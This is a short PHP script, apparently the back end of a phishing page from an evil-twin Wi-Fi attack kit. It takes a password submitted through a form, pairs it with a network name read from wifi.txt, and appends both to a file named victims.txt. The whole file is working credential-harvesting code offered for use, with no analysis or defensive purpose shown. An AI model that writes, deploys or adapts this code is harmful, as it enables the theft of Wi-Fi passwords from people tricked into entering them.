<?php
$p = $_POST['pass'];
$u = fread(fopen('wifi.txt','r'),filesize('wifi.txt'));
if ($p){
    $f = fopen('victims.txt','a+');
    fwrite($f,$u.'<!:!>'.$p."\n");
    fclose($f);
}
?>